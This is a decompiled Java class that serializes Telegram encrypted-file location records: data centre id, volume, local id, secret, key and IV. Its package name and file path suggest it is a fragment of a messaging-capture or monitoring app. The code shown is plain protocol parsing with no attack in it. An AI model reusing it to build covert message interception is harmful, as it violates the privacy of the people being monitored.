package com.vvt.capture.telegram.internal;

public class TLRPC$TL_fileEncryptedLocation
  extends TLRPC.FileLocation
{
  public static int constructor = 1431655764;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.dc_id = i;
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.volume_id = l;
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.local_id = i;
    l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.secret = l;
    byte[] arrayOfByte = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.key = arrayOfByte;
    arrayOfByte = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.iv = arrayOfByte;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    i = this.dc_id;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.volume_id;
    paramAbstractSerializedData.writeInt64(l);
    i = this.local_id;
    paramAbstractSerializedData.writeInt32(i);
    l = this.secret;
    paramAbstractSerializedData.writeInt64(l);
    byte[] arrayOfByte = this.key;
    paramAbstractSerializedData.writeByteArray(arrayOfByte);
    arrayOfByte = this.iv;
    paramAbstractSerializedData.writeByteArray(arrayOfByte);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_fileEncryptedLocation.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */